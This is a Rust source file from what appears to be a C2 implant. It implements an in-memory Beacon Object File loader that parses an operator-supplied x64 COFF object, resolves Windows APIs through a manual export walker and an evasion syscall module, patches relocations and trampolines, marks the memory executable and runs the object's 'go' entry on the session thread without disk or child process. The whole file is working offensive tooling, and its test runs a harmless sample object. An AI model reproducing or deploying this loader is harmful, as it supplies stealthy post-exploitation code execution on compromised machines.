//! In-process COFF object execution (ABR-T034) — the BOF convention:
//! an operator-supplied x64 .obj is linked in memory against a minimal
//! Beacon API plus the loaded-module exports, relocated, flipped RX
//! and its `go(args, argslen)` entry runs on the session thread. No
//! child process, no loader, no disk.

// Same on-demand FFI transmute idiom as modules.rs (see the note there).
#![allow(clippy::missing_transmute_annotations)]

use crate::evasion::syscalls;
use std::sync::Mutex;

const IMAGE_REL_AMD64_ADDR64: u16 = 1;
const IMAGE_REL_AMD64_ADDR32: u16 = 2;
/// ADDR32NB (RVA, no base) — written like ADDR32; the standard BOF
/// loader approximation.
const IMAGE_REL_AMD64_ADDR32NB: u16 = 3;
const IMAGE_REL_AMD64_REL32: u16 = 4;

/// Capture buffer fed by the Beacon API callbacks.
static OUTPUT: Mutex<Vec<u8>> = Mutex::new(Vec::new());

// --- Beacon API (the minimal set community BOFs rely on) ---

unsafe extern "system" fn beacon_output(_kind: u32, data: *const u8, len: i32) {
    if data.is_null() || len <= 0 {
        return;
    }
    if let Ok(mut buffer) = OUTPUT.lock() {
        buffer.extend_from_slice(std::slice::from_raw_parts(data, len as usize));
        buffer.push(b'\n');
    }
}

unsafe extern "system" fn beacon_printf(_kind: u32, _fmt: *const u8) {
    // Variadic — not forwarded (would need asm shims); BOFs using only
    // BeaconOutput/BeaconData* work today; documented limitation.
}

#[repr(C)]
struct ArgsParser {
    buffer: *const u8,
    offset: usize,
    length: usize,
}

unsafe extern "system" fn beacon_data_parse(parser: *mut ArgsParser, buffer: *const u8, size: i32) {
    if parser.is_null() {
        return;
    }
    (*parser).buffer = buffer;
    (*parser).offset = 4; // skip the total-length dword
    (*parser).length = size.max(0) as usize;
}

unsafe extern "system" fn beacon_data_int(parser: *mut ArgsParser) -> i32 {
    if parser.is_null() || (*parser).buffer.is_null() || (*parser).offset + 4 > (*parser).length {
        return 0;
    }
    let bytes = std::slice::from_raw_parts((*parser).buffer.add((*parser).offset), 4);
    (*parser).offset += 4;
    i32::from_le_bytes(bytes.try_into().unwrap_or([0; 4]))
}

unsafe extern "system" fn beacon_data_short(parser: *mut ArgsParser) -> i16 {
    if parser.is_null() || (*parser).buffer.is_null() || (*parser).offset + 2 > (*parser).length {
        return 0;
    }
    let bytes = std::slice::from_raw_parts((*parser).buffer.add((*parser).offset), 2);
    (*parser).offset += 2;
    i16::from_le_bytes(bytes.try_into().unwrap_or([0; 2]))
}

unsafe extern "system" fn beacon_data_length(parser: *const ArgsParser) -> i32 {
    if parser.is_null() {
        return 0;
    }
    ((*parser).length.saturating_sub((*parser).offset)) as i32
}

unsafe extern "system" fn beacon_data_extract(
    parser: *mut ArgsParser,
    size: *mut i32,
) -> *const u8 {
    if parser.is_null() || (*parser).buffer.is_null() {
        return std::ptr::null();
    }
    // Null-terminated string argument per the convention.
    let mut end = (*parser).offset;
    let bytes = std::slice::from_raw_parts((*parser).buffer, (*parser).length);
    while end < bytes.len() && bytes[end] != 0 {
        end += 1;
    }
    let start = (*parser).buffer.add((*parser).offset);
    if !size.is_null() {
        *size = (end - (*parser).offset) as i32;
    }
    (*parser).offset = (end + 1).min((*parser).length);
    start
}

unsafe extern "system" fn get_current_process() -> usize {
    usize::MAX
}

unsafe extern "system" fn get_current_thread() -> usize {
    usize::MAX - 2
}

/// Beacon API table: name → function pointer.
fn beacon_api(name: &str) -> Option<usize> {
    let pointer = match name {
        "BeaconOutput" => beacon_output as *const () as usize,
        "BeaconPrintf" => beacon_printf as *const () as usize,
        "BeaconDataParse" => beacon_data_parse as *const () as usize,
        "BeaconDataInt" => beacon_data_int as *const () as usize,
        "BeaconDataShort" => beacon_data_short as *const () as usize,
        "BeaconDataLength" => beacon_data_length as *const () as usize,
        "BeaconDataExtract" => beacon_data_extract as *const () as usize,
        "GetCurrentProcess" => get_current_process as *const () as usize,
        "GetCurrentThread" => get_current_thread as *const () as usize,
        _ => return None,
    };
    Some(pointer)
}

/// External resolution order: Beacon API, then a curated module list
/// through the manual export walker.
fn resolve_external(name: &str) -> Option<usize> {
    if let Some(pointer) = beacon_api(name) {
        return Some(pointer);
    }
    // Some toolchains emit a leading underscore.
    let stripped = name.strip_prefix('_').unwrap_or(name);
    if let Some(pointer) = beacon_api(stripped) {
        return Some(pointer);
    }
    for module in [
        "ntdll.dll",
        "kernel32.dll",
        "user32.dll",
        "advapi32.dll",
        "ws2_32.dll",
    ] {
        if let Some(addr) = unsafe { syscalls::export_address(module, name) } {
            return Some(addr);
        }
        if let Some(addr) = unsafe { syscalls::export_address(module, stripped) } {
            return Some(addr);
        }
    }
    None
}

// --- COFF structures ---

struct Section {
    virtual_size: u32,
    // Always 0 in unlinked objects; kept for the header shape.
    #[allow(dead_code)]
    virtual_address: u32,
    raw_size: u32,
    raw_pointer: u32,
    reloc_pointer: u32,
    reloc_count: u16,
    flags: u32,
}

struct Symbol {
    value: u32,
    section_index: u16,
    name: String,
}

fn read_u16(buf: &[u8], off: usize) -> Option<u16> {
    Some(u16::from_le_bytes(buf.get(off..off + 2)?.try_into().ok()?))
}
fn read_u32(buf: &[u8], off: usize) -> Option<u32> {
    Some(u32::from_le_bytes(buf.get(off..off + 4)?.try_into().ok()?))
}

type CoffContents = (u32, Vec<Section>, Vec<Symbol>, u32, u32);

fn parse_coff(obj: &[u8]) -> Result<CoffContents, String> {
    if obj.len() < 20 {
        return Err("COFF header truncated".into());
    }
    let machine = read_u16(obj, 0).unwrap_or(0);
    if machine != 0x8664 {
        return Err(format!("not an AMD64 object (machine {machine:#06x})"));
    }
    let n_sections = read_u16(obj, 2).unwrap_or(0) as usize;
    let symbol_pointer = read_u32(obj, 8).unwrap_or(0) as usize;
    let n_symbols = read_u32(obj, 12).unwrap_or(0) as usize;
    let opt_size = read_u16(obj, 16).unwrap_or(0) as usize;

    let mut sections = Vec::with_capacity(n_sections);
    for i in 0..n_sections {
        let base = 20 + opt_size + i * 40;
        if base + 40 > obj.len() {
            return Err("section header truncated".into());
        }
        sections.push(Section {
            virtual_size: read_u32(obj, base + 8).unwrap_or(0),
            virtual_address: read_u32(obj, base + 12).unwrap_or(0),
            raw_size: read_u32(obj, base + 16).unwrap_or(0),
            raw_pointer: read_u32(obj, base + 20).unwrap_or(0),
            reloc_pointer: read_u32(obj, base + 24).unwrap_or(0),
            reloc_count: read_u16(obj, base + 32).unwrap_or(0),
            flags: read_u32(obj, base + 36).unwrap_or(0),
        });
    }

    // Symbol table: 18-byte entries; names > 8 chars live in the
    // string table right after the symbols.
    let strings_base = symbol_pointer + n_symbols * 18;
    let mut symbols = Vec::with_capacity(n_symbols);
    for i in 0..n_symbols {
        let base = symbol_pointer + i * 18;
        if base + 18 > obj.len() {
            break;
        }
        let zeroes = read_u32(obj, base).unwrap_or(0);
        let name = if zeroes == 0 {
            let offset = read_u32(obj, base + 4).unwrap_or(0) as usize;
            let start = strings_base + offset;
            let mut end = start;
            while end < obj.len() && obj[end] != 0 {
                end += 1;
            }
            String::from_utf8_lossy(&obj[start..end.min(obj.len())]).into_owned()
        } else {
            String::from_utf8_lossy(&obj[base..base + 8])
                .trim_end_matches('\0')
                .to_string()
        };
        let value = read_u32(obj, base + 8).unwrap_or(0);
        let section_index = read_u16(obj, base + 12).unwrap_or(0);
        // Auxiliary symbols: skip (aux count = high byte of type).
        let aux = obj.get(base + 17).copied().unwrap_or(0);
        symbols.push(Symbol {
            value,
            section_index,
            name,
        });
        let _ = aux;
        let _ = i;
    }
    Ok((
        (n_symbols) as u32,
        sections,
        symbols,
        symbol_pointer as u32,
        strings_base as u32,
    ))
}

/// Public entry of the EXECBOF task.
pub fn run(obj: &[u8], args: &[u8]) -> Result<Vec<u8>, String> {
    OUTPUT.lock().map_err(|_| "output poisoned")?.clear();
    let (_, sections, symbols, _, _) = parse_coff(obj)?;

    // COFF objects are UNLINKED: every section header carries
    // VirtualAddress 0. The loader assigns the layout — sections in
    // header order, 16-byte aligned, discardables skipped.
    let mut layout: Vec<(usize /*assigned va*/, &Section)> = Vec::new();
    let mut cursor = 0usize;
    for section in &sections {
        if section.flags & 0x0200_0000 != 0 {
            continue; // IMAGE_SCN_MEM_DISCARDABLE
        }
        cursor = (cursor + 0xF) & !0xF;
        layout.push((cursor, section));
        cursor += section.virtual_size.max(section.raw_size) as usize;
    }
    // Pre-pass: resolve every external referenced by a REL32 relocation
    // whose target may sit beyond +/-2 GiB of the image (a private
    // allocation vs a loaded module is typically terabytes apart) and
    // give each a `movabs rax, target; jmp rax` trampoline INSIDE the
    // image — REL32 then always reaches.
    let mut externals: Vec<(usize /*sym index*/, usize /*target*/)> = Vec::new();
    for section in &sections {
        if section.flags & 0x0200_0000 != 0 || section.reloc_count == 0 {
            continue;
        }
        let table = section.reloc_pointer as usize;
        for i in 0..section.reloc_count as usize {
            let entry = table + i * 10;
            if entry + 10 > obj.len() {
                break;
            }
            let kind = read_u16(obj, entry + 8).unwrap_or(0);
            if kind != IMAGE_REL_AMD64_REL32 {
                continue;
            }
            let sym = read_u32(obj, entry + 4).unwrap_or(0) as usize;
            let Some(symbol) = symbols.get(sym) else {
                continue;
            };
            if symbol.section_index != 0 {
                continue; // internal: inside the image already
            }
            if externals.iter().any(|(index, _)| *index == sym) {
                continue;
            }
            let target = resolve_external(&symbol.name)
                .ok_or_else(|| format!("unresolved symbol '{}'", symbol.name))?;
            externals.push((sym, target));
        }
    }
    let stub_area = externals.len() * 16;
    cursor = (cursor + 0xF) & !0xF;
    let stub_base_va = cursor;
    cursor += stub_area;
    let image_size = cursor;
    if image_size < 16 {
        return Err("empty COFF image".into());
    }
    let assigned = |index: usize| -> Option<usize> {
        // Section index 1..=n maps to the layout positions in order.
        let mut seen = 0usize;
        for (position, section) in sections.iter().enumerate() {
            if section.flags & 0x0200_0000 == 0 {
                seen += 1;
            }
            if position + 1 == index {
                if section.flags & 0x0200_0000 != 0 {
                    return None;
                }
                return layout.get(seen - 1).map(|(va, _)| *va);
            }
        }
        None
    };

    let base = match unsafe { syscalls::alloc_rw(image_size) } {
        Some(base) if base != 0 => base,
        _ => return Err("image allocation failed".into()),
    };

    // Copy raw section data in at the assigned offsets.
    unsafe {
        std::ptr::write_bytes(base as *mut u8, 0, image_size);
    }
    for (va, section) in &layout {
        if section.raw_size == 0 {
            continue;
        }
        let dst = base + va;
        let src = section.raw_pointer as usize;
        let len = section.raw_size as usize;
        if src + len > obj.len() || dst + len > base + image_size {
            return Err("section data out of bounds".into());
        }
        unsafe {
            std::ptr::copy_nonoverlapping(obj.as_ptr().add(src), dst as *mut u8, len);
        }
    }

    // Trampoline stubs at the tail of the image.
    for (slot, (_, target)) in externals.iter().enumerate() {
        let target = *target;
        let dst = base + stub_base_va + slot * 16;
        let stub = [
            0x48u8,
            0xB8, // movabs rax, imm64
            target as u8,
            (target >> 8) as u8,
            (target >> 16) as u8,
            (target >> 24) as u8,
            (target >> 32) as u8,
            (target >> 40) as u8,
            (target >> 48) as u8,
            (target >> 56) as u8,
            0xFF,
            0xE0, // jmp rax
        ];
        unsafe {
            std::ptr::copy_nonoverlapping(stub.as_ptr(), dst as *mut u8, stub.len());
        }
    }

    // Symbol addresses: value is an offset into its section, resolved
    // against the assigned layout.
    let symbol_address = |index: usize| -> Option<usize> {
        let symbol = symbols.get(index)?;
        if symbol.section_index == 0 {
            return None; // external
        }
        let va = assigned(symbol.section_index as usize)?;
        Some(base + va + symbol.value as usize)
    };

    // Relocations per section (at its assigned layout offset).
    for section in &sections {
        if section.flags & 0x0200_0000 != 0 || section.reloc_count == 0 {
            continue;
        }
        let section_index = sections
            .iter()
            .position(|probe| std::ptr::eq(probe, section))
            .unwrap_or_default()
            + 1;
        let section_va = assigned(section_index).unwrap_or(0);
        let table = section.reloc_pointer as usize;
        for i in 0..section.reloc_count as usize {
            let entry = table + i * 10;
            if entry + 10 > obj.len() {
                break;
            }
            let write_rva = read_u32(obj, entry).unwrap_or(0) as usize;
            // COFF relocation: { u32 rva; u32 symbol_index; u16 type; }
            let sym = read_u32(obj, entry + 4).unwrap_or(0) as usize;
            let kind = read_u16(obj, entry + 8).unwrap_or(0);
            let write = base + section_va + write_rva;
            let target = match symbol_address(sym) {
                Some(address) => address,
                None => {
                    // Pre-resolved in the stub pass: REL32 references
                    // the in-image trampoline, everything else the
                    // direct address.
                    if kind == IMAGE_REL_AMD64_REL32 {
                        // The stub slot is the entry's POSITION, not the
                        // symbol index it carries.
                        externals
                            .iter()
                            .enumerate()
                            .find(|(_, (index, _))| *index == sym)
                            .map(|(slot, _)| base + stub_base_va + slot * 16)
                    } else {
                        let name = symbols.get(sym).map(|s| s.name.clone()).unwrap_or_default();
                        resolve_external(&name)
                    }
                    .ok_or_else(|| {
                        format!(
                            "unresolved symbol #{}",
                            symbols.get(sym).map(|s| s.name.clone()).unwrap_or_default()
                        )
                    })?
                }
            };
            unsafe {
                // COFF relocation slots are not guaranteed aligned.
                match kind {
                    IMAGE_REL_AMD64_ADDR64 => {
                        std::ptr::write_unaligned(write as *mut u64, target as u64);
                    }
                    IMAGE_REL_AMD64_ADDR32 | IMAGE_REL_AMD64_ADDR32NB => {
                        std::ptr::write_unaligned(write as *mut u32, target as u32);
                    }
                    IMAGE_REL_AMD64_REL32 => {
                        let delta = (target as i64) - (write as i64 + 4);
                        std::ptr::write_unaligned(write as *mut i32, delta as i32);
                    }
                    _ => return Err(format!("unsupported relocation {kind:#06x}")),
                }
            }
        }
    }

    // Find `go`, flip RX, call it with the packed args.
    let go = symbols
        .iter()
        .position(|s| s.name == "go")
        .and_then(symbol_address)
        .ok_or("no 'go' entry symbol")?;

    // Args live in the beacon-args buffer: our stack slice is fine —
    // pass a pointer to a stable copy.
    let args_storage = args.to_vec();
    let args_ptr = if args_storage.is_empty() {
        std::ptr::null::<u8>() as usize
    } else {
        args_storage.as_ptr() as usize
    };

    unsafe { syscalls::protect(base, image_size, 0x20) }; // PAGE_EXECUTE_READ
    type Go = unsafe extern "system" fn(usize, i32);
    let entry: Go = unsafe { std::mem::transmute(go) };
    unsafe { entry(args_ptr, args_storage.len() as i32) };

    let out = OUTPUT.lock().map_err(|_| "output poisoned")?.clone();
    if out.is_empty() {
        Ok("bof: go returned (no output)\n".as_bytes().to_vec())
    } else {
        Ok(out)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Compiles a no_std test BOF with rustc --emit=obj and runs it
    /// through the full loader: the object calls BeaconOutput, which
    /// must land in the capture buffer. This exercises parsing,
    /// relocation (ADDR64 + REL32 on the MSVC toolchain), external
    /// resolution and RX execution end-to-end on this host.
    #[test]
    fn test_bof_compiles_and_runs() {
        let dir = std::env::temp_dir().join(format!("abraham-bof-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        let source = dir.join("bof.rs");
        std::fs::write(
            &source,
            r##"#![no_std]
use core::panic::PanicInfo;
#[panic_handler]
fn panic(_: &PanicInfo) -> ! { loop {} }

unsafe extern "C" {
    fn BeaconOutput(kind: u32, data: *const u8, len: i32);
}

const PAYLOAD: &[u8] = b"bof-live-ok";

#[no_mangle]
pub unsafe extern "system" fn go(_args: *const u8, _len: i32) {
    BeaconOutput(0, PAYLOAD.as_ptr(), PAYLOAD.len() as i32);
}
"##,
        )
        .unwrap();
        let object = dir.join("bof.obj");
        let rustc = std::env::var("CARGO").ok().map(|cargo| {
            std::path::Path::new(&cargo)
                .with_file_name("rustc")
                .to_string_lossy()
                .into_owned()
        });
        let status = std::process::Command::new(rustc.unwrap_or_else(|| "rustc".into()))
            .args(["--emit=obj", "--edition=2021", "--crate-type=cdylib"])
            .arg("-C")
            .arg("panic=abort")
            .arg("-o")
            .arg(&object)
            .arg(&source)
            .status()
            .expect("rustc spawn");
        assert!(status.success(), "rustc --emit=obj failed");
        let obj = std::fs::read(
            std::env::var("ABRAHAM_BOF_OBJ")
                .map(std::path::PathBuf::from)
                .unwrap_or(object),
        )
        .unwrap();
        let (_, sections, symbols, _, _) = parse_coff(&obj).unwrap();
        for (i, s) in sections.iter().enumerate() {
            eprintln!(
                "SEC {i} vsz={:#x} va={:#x} rawsz={:#x} rawptr={:#x} relocs={} flags={:#x}",
                s.virtual_size,
                s.virtual_address,
                s.raw_size,
                s.raw_pointer,
                s.reloc_count,
                s.flags
            );
        }
        for (i, s) in symbols.iter().enumerate() {
            eprintln!(
                "SYM {i} val={:#x} sec={} name={}",
                s.value, s.section_index, s.name
            );
        }
        let out = run(&obj, b"").expect("bof run");
        let text = String::from_utf8_lossy(&out);
        assert!(text.contains("bof-live-ok"), "output: {text}");
        let _ = std::fs::remove_dir_all(&dir);
    }
}
